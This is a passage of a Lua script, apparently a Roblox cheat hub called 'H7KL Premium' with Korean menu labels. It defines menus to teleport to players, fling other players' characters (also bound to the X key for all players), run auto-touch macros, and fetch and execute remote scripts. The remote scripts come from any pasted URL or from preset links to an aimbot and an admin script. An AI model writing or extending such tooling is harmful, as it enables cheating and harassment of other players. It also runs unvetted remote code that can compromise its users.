        if p ~= lp then table.insert(t, p.Name) end
    end
    if pDropdown and pDropdown.Refresh then pDropdown:Refresh(t, true) end
end
pDropdown = TTab:CreateDropdown({
    Name = "플레이어",
    Options = (function()
        local t = {}
        for _, p in ipairs(Players:GetPlayers()) do if p ~= lp then table.insert(t, p.Name) end end
        return t
    end)(),
    CurrentOption = {"없음"}, Flag = "selP",
    Callback = function() end
})
TTab:CreateButton({Name = "선택한 플레이어에게 TP",
    Callback = function()
        local s = Rayfield.Flags.selP
        if not s then notify("선택 안됨"); return end
        local n = type(s) == "table" and s[1] or s
        local t = Players:FindFirstChild(n)
        if t then tpTo(t); notify(n .. "에게 TP") end
    end})
TTab:CreateButton({Name = "목록 새로고침", Callback = refreshP})
TTab:CreateButton({Name = "🔥 선택한 플레이어 플링",
    Callback = function()
        local s = Rayfield.Flags.selP
        if not s then notify("선택 안됨"); return end
        local n = type(s) == "table" and s[1] or s
        local t = Players:FindFirstChild(n)
        if t and t.Character then flingChar(t.Character); notify(n .. " 플링!") end
    end})

Players.PlayerAdded:Connect(function() task.wait(0.3); refreshP() end)
Players.PlayerRemoving:Connect(function() task.wait(0.3); refreshP() end)

local McTab = Window:CreateTab("매크로", 7734006596)
McTab:CreateToggle({Name = "매크로 ON/OFF", CurrentValue = false, Flag = "mOn",
    Callback = function(v)
        if v then state.macroOn = true; notify("매크로 ON")
        else stopMacro(); notify("매크로 OFF") end
    end})
McTab:CreateSlider({Name = "터치 간격 (ms)", Range = {1, 100}, Increment = 1, Suffix = "ms",
    CurrentValue = 50, Flag = "mD",
    Callback = function(v) state.macroDelay = v / 1000 end})
McTab:CreateButton({Name = "시작", Callback = function() startMacro() end})
McTab:CreateButton({Name = "중지", Callback = function() stopMacro() end})

local ScriptTab = Window:CreateTab("스크립트 실행", 7733970281)
ScriptTab:CreateSection("외부 스크립트")
local scriptUrl = ""
ScriptTab:CreateInput({
    Name = "스크립트 URL 입력",
    CurrentValue = "",
    PlaceholderText = "https://pastefy.app/.../raw",
    RemoveTextAfterFocusLost = false,
    Flag = "scriptUrlIn",
    Callback = function(t) scriptUrl = t end
})
ScriptTab:CreateButton({
    Name = "🚀 입력한 URL 실행",
    Callback = function()
        if scriptUrl == "" then notify("URL 입력 필요"); return end
        executeExternalScript(scriptUrl)
    end
})
ScriptTab:CreateSection("무료")
ScriptTab:CreateButton({
    Name = "🎯 라이벌 에임봇",
    Callback = function() executeExternalScript("https://pastefy.app/YiGY38uo/raw") end
})
ScriptTab:CreateButton({
    Name = "⚔️ 인피니티 야드 어드민",
    Callback = function() executeExternalScript("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source") end
})

local CTab = Window:CreateTab("명령어", 7733962283)
CTab:CreateSection("명령어 실행")
local function buildList()
    local t = {}
    for k in pairs(Cmds) do table.insert(t, k) end
    table.sort(t)
    return t
end
local function buildOptions()
    local opts = {}
    for _, k in ipairs(buildList()) do table.insert(opts, k .. " — " .. (Cmds[k].desc or "")) end
    return opts
end
local cmdDropdown
cmdDropdown = CTab:CreateDropdown({
    Name = "명령어 선택 (즉시 실행)",
    Options = buildOptions(),
    CurrentOption = {"선택..."}, Flag = "cmdSel",
    Callback = function(o)
        if not o or #o == 0 then return end
        local name = o[1]:match("^(%S+)")
        if not name then return end
        local c = Cmds[name:lower()]
        if c then
            local ok, err = pcall(c.fn, {})
            if not ok then notify("오류: " .. tostring(err)) end
        end
        task.wait(0.3)
        safeCall(function() cmdDropdown:Refresh(buildOptions(), true) end)
    end
})
CTab:CreateButton({Name = "목록 새로고침",
    Callback = function()
        safeCall(function() cmdDropdown:Refresh(buildOptions(), true) end)
        notify("명령어 " .. #buildList() .. "개")
    end})
CTab:CreateParagraph({Title = "명령어 (" .. #buildList() .. "개)",
    Content = table.concat(buildList(), "  ")})
CTab:CreateSection("접두사")
CTab:CreateInput({
    Name = "접두사 변경", CurrentValue = state.prefix,
    PlaceholderText = ".", RemoveTextAfterFocusLost = false, Flag = "pxIn",
    Callback = function(t)
        if not t or t == "" then notify("비울 수 없음"); return end
        if #t > 3 then notify("최대 3자"); return end
        state.prefix = t
        notify("접두사 '" .. t .. "'")
    end})
CTab:CreateButton({Name = "'.'", Callback = function() state.prefix = "."; notify("'.'") end})
CTab:CreateButton({Name = "';'", Callback = function() state.prefix = ";"; notify("';'") end})
CTab:CreateButton({Name = "'!'", Callback = function() state.prefix = "!"; notify("'!'") end})
CTab:CreateToggle({Name = "채팅 명령어 ON/OFF", CurrentValue = true, Flag = "chatOn",
    Callback = function(v) state.chatOn = v end})

-- 단축키
UIS.InputBegan:Connect(function(input, gpe)
    if gpe then return end
    local k = input.KeyCode
    if k == Enum.KeyCode.Z then setFly(not state.fly)
    elseif k == Enum.KeyCode.R then respawnNormal()
    elseif k == Enum.KeyCode.X then flingAll() end
end)

notify("로드 완료 • developed by wangwei", "H7KL Premium")
